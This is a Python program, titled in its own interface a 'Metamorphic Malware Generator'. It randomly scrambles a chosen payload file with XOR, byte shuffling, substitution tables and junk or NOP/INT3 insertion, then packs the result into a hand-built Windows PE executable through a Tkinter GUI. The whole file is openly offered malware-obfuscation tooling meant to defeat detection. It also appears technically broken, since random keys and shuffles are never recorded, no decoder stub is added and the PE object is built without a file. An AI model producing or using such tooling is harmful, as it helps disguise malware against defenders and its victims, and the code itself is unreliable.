import random
import string
import base64
import pefile
from tkinter import Tk, Label, Entry, Button, filedialog, messagebox

class MetamorphicEngine:
    def __init__(self):
        self.transformations = [
            self.xor_transform,
            self.swap_nibbles,
            self.insert_junk_code,
            self.add_random_constant,
            self.bitwise_not_transform,
            self.shuffle_bytes,
            self.rotate_bits,
            self.reverse_bytes,
            self.encrypt_payload,
            self.obfuscate_control_flow,
            self.base64_encode,
            self.rot13_transform,
            self.pseudo_instruction_insertion,
            self.polymorphic_substitution,
            self.split_and_reorder
        ]
    
    def apply_single_transformation(self, payload):
        transform_idx = random.randint(0, len(self.transformations) - 1)
        self.transformations[transform_idx](payload)
    
    def apply_full_sequence(self, payload):
        sequence = self.generate_random_sequence()
        for transform_idx in sequence:
            self.transformations[transform_idx](payload)
            print(f"After {self.transformations[transform_idx].__name__}: {payload.hex()}")
    
    def apply_dual_sequence(self, payload):
        sequence = self.generate_random_sequence()
        for transform_idx in sequence:
            self.transformations[transform_idx](payload)
        for transform_idx in reversed(sequence):
            self.transformations[transform_idx](payload)
    
    def generate_random_sequence(self):
        sequence_length = min(random.randint(3, len(self.transformations)), 5)  # Limit to 5 transformations
        sequence = random.sample(range(len(self.transformations)), sequence_length)
        return sequence
    
    def xor_transform(self, payload):
        key = random.randint(0, 255)
        for i in range(len(payload)):
            payload[i] ^= key
    
    def swap_nibbles(self, payload):
        for i in range(len(payload)):
            payload[i] = ((payload[i] << 4) & 0xF0) | ((payload[i] >> 4) & 0x0F)
    
    def insert_junk_code(self, payload):
        junk_code = bytearray([random.randint(0, 255) for _ in range(random.randint(1, 5))])
        insert_pos = random.randint(0, len(payload))
        payload[insert_pos:insert_pos] = junk_code
    
    def add_random_constant(self, payload):
        constant = random.randint(0, 255)
        for i in range(len(payload)):
            payload[i] = (payload[i] + constant) % 256
    
    def bitwise_not_transform(self, payload):
        for i in range(len(payload)):
            payload[i] = ~payload[i] & 0xFF
    
    def shuffle_bytes(self, payload):
        random.shuffle(payload)
    
    def rotate_bits(self, payload, n=1):
        for i in range(len(payload)):
            payload[i] = ((payload[i] << n) & 0xFF) | (payload[i] >> (8 - n))
    
    def reverse_bytes(self, payload):
        payload.reverse()
    
    def encrypt_payload(self, payload):
        key = random.randint(1, 255)
        for i in range(len(payload)):
            payload[i] = (payload[i] + key) % 256
    
    def obfuscate_control_flow(self, payload):
        labels = [random.choice(string.ascii_letters) for _ in range(random.randint(1, 5))]
        for label in labels:
            payload.insert(random.randint(0, len(payload)), ord(label))
            payload.insert(random.randint(0, len(payload)), ord(':'))
    
    def base64_encode(self, payload):
        encoded = base64.b64encode(payload)
        payload.clear()
        payload.extend(encoded)
    
    def rot13_transform(self, payload):
        for i in range(len(payload)):
            payload[i] = (payload[i] + 13) % 256
    
    def pseudo_instruction_insertion(self, payload):
        pseudo_instructions = [0x90, 0xCC]  # NOP and INT3 for x86
        for _ in range(random.randint(1, 3)):
            payload.insert(random.randint(0, len(payload)), random.choice(pseudo_instructions))
    
    def polymorphic_substitution(self, payload):
        subst_table = {i: random.randint(0, 255) for i in range(256)}
        for i in range(len(payload)):
            payload[i] = subst_table[payload[i]]
    
    def split_and_reorder(self, payload):
        chunks = [payload[i:i+random.randint(1, 4)] for i in range(0, len(payload), random.randint(1, 4))]
        random.shuffle(chunks)
        payload.clear()
        for chunk in chunks:
            payload.extend(chunk)

def create_pe_file(payload, output_file):
    pe = pefile.PE()
    
    # DOS Header
    pe.DOS_HEADER.e_magic = 0x5A4D  # MZ
    pe.DOS_HEADER.e_cblp = 0x0090
    pe.DOS_HEADER.e_cp = 0x0003
    pe.DOS_HEADER.e_crlc = 0x0000
    pe.DOS_HEADER.e_cparhdr = 0x0004
    pe.DOS_HEADER.e_minalloc = 0x0000
    pe.DOS_HEADER.e_maxalloc = 0xFFFF
    pe.DOS_HEADER.e_ss = 0x0000
    pe.DOS_HEADER.e_sp = 0x00B8
    pe.DOS_HEADER.e_csum = 0x0000
    pe.DOS_HEADER.e_ip = 0x0000
    pe.DOS_HEADER.e_cs = 0x0000
    pe.DOS_HEADER.e_lfarlc = 0x0040
    pe.DOS_HEADER.e_ovno = 0x0000
    pe.DOS_HEADER.e_res = [0x0000, 0x0000, 0x0000, 0x0000]
    pe.DOS_HEADER.e_oemid = 0x0000
    pe.DOS_HEADER.e_oeminfo = 0x0000
    pe.DOS_HEADER.e_res2 = [0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000]
    pe.DOS_HEADER.e_lfanew = 0x00E0
    
    # NT Headers
    pe.NT_HEADERS.Signature = 0x00004550  # PE00
    pe.NT_HEADERS.FILE_HEADER.Machine = 0x014C  # x86
    pe.NT_HEADERS.FILE_HEADER.NumberOfSections = 0x0003
    pe.NT_HEADERS.FILE_HEADER.TimeDateStamp = 0x5D5B80D0
    pe.NT_HEADERS.FILE_HEADER.PointerToSymbolTable = 0x00000000
    pe.NT_HEADERS.FILE_HEADER.NumberOfSymbols = 0x00000000
    pe.NT_HEADERS.FILE_HEADER.SizeOfOptionalHeader = 0x00E0
    pe.NT_HEADERS.FILE_HEADER.Characteristics = 0x010F  # Executable Image, 32 bit, No Relocations
    
    # Optional Header
    pe.OPTIONAL_HEADER.Magic = 0x010B  # PE32
    pe.OPTIONAL_HEADER.MajorLinkerVersion = 0x09
    pe.OPTIONAL_HEADER.MinorLinkerVersion = 0x00
    pe.OPTIONAL_HEADER.SizeOfCode = 0x00002000
    pe.OPTIONAL_HEADER.SizeOfInitializedData = 0x00002000
    pe.OPTIONAL_HEADER.SizeOfUninitializedData = 0x00000000
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = 0x00001000
    pe.OPTIONAL_HEADER.BaseOfCode = 0x00001000
    pe.OPTIONAL_HEADER.BaseOfData = 0x00002000
    pe.OPTIONAL_HEADER.ImageBase = 0x00400000
    pe.OPTIONAL_HEADER.SectionAlignment = 0x00001000
    pe.OPTIONAL_HEADER.FileAlignment = 0x00000200
    pe.OPTIONAL_HEADER.MajorOperatingSystemVersion = 0x0004
    pe.OPTIONAL_HEADER.MinorOperatingSystemVersion = 0x0000
    pe.OPTIONAL_HEADER.MajorImageVersion = 0x0000
    pe.OPTIONAL_HEADER.MinorImageVersion = 0x0000
    pe.OPTIONAL_HEADER.MajorSubsystemVersion = 0x0004
    pe.OPTIONAL_HEADER.MinorSubsystemVersion = 0x0000
    pe.OPTIONAL_HEADER.Win32VersionValue = 0x00000000
    pe.OPTIONAL_HEADER.SizeOfImage = 0x00004000
    pe.OPTIONAL_HEADER.SizeOfHeaders = 0x00000400
    pe.OPTIONAL_HEADER.CheckSum = 0x00000000
    pe.OPTIONAL_HEADER.Subsystem = 0x0003  # Console
    pe.OPTIONAL_HEADER.DllCharacteristics = 0x0000
    pe.OPTIONAL_HEADER.SizeOfStackReserve = 0x00100000
    pe.OPTIONAL_HEADER.SizeOfStackCommit = 0x00001000
    pe.OPTIONAL_HEADER.SizeOfHeapReserve = 0x00100000
    pe.OPTIONAL_HEADER.SizeOfHeapCommit = 0x00001000
    pe.OPTIONAL_HEADER.LoaderFlags = 0x00000000
    pe.OPTIONAL_HEADER.NumberOfRvaAndSizes = 0x00000010
    
    # Create a section for the payload
    section_name = b'.text\x00\x00\x00'
    section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
    section.Name = section_name
    section.Misc_VirtualSize = len(payload)
    section.VirtualAddress = 0x1000
    section.SizeOfRawData = ((len(payload) + 0x1FF) // 0x200) * 0x200  # Align to 512 bytes
    section.PointerToRawData = 0x400
    section.PointerToRelocations = 0x0000
    section.PointerToLinenumbers = 0x0000
    section.NumberOfRelocations = 0x0000
    section.NumberOfLinenumbers = 0x0000
    section.Characteristics = 0x60000020  # Code | Execute | Read
    
    pe.sections.append(section)
    
    pe.__data__ = bytearray(pe.write())
    pe.set_bytes_at_offset(section.PointerToRawData, payload + b'\x00' * (section.SizeOfRawData - len(payload)))
    
    pe.write(output_file)

def browse_file(entry):
    file_path = filedialog.askopenfilename()
    entry.delete(0, 'end')
    entry.insert(0, file_path)

def save_file(entry):
    file_path = filedialog.asksaveasfilename(defaultextension=".exe", filetypes=[("Executable files", "*.exe")])
    entry.delete(0, 'end')
    entry.insert(0, file_path)

def process_files(payload_path, output_path):
    try:
        with open(payload_path, "rb") as f:
            payload = bytearray(f.read())

        engine = MetamorphicEngine()
        engine.apply_full_sequence(payload)

        create_pe_file(payload, output_path)
        messagebox.showinfo("Success", f"Metamorphically transformed payload saved to {output_path}")
    except Exception as e:
        messagebox.showerror("Error", f"An error occurred: {str(e)}")

def main():
    root = Tk()
    root.title("Metamorphic Malware Generator")

    Label(root, text="Payload File").grid(row=0, column=0, padx=10, pady=10)
    payload_entry = Entry(root, width=50)
    payload_entry.grid(row=0, column=1, padx=10, pady=10)
    Button(root, text="Browse", command=lambda: browse_file(payload_entry)).grid(row=0, column=2, padx=10, pady=10)

    Label(root, text="Output File").grid(row=1, column=0, padx=10, pady=10)
    output_entry = Entry(root, width=50)
    output_entry.grid(row=1, column=1, padx=10, pady=10)
    Button(root, text="Save As", command=lambda: save_file(output_entry)).grid(row=1, column=2, padx=10, pady=10)

    Button(root, text="Generate", command=lambda: process_files(payload_entry.get(), output_entry.get())).grid(row=2, column=1, pady=20)

    root.mainloop()

if __name__ == "__main__":
    main()
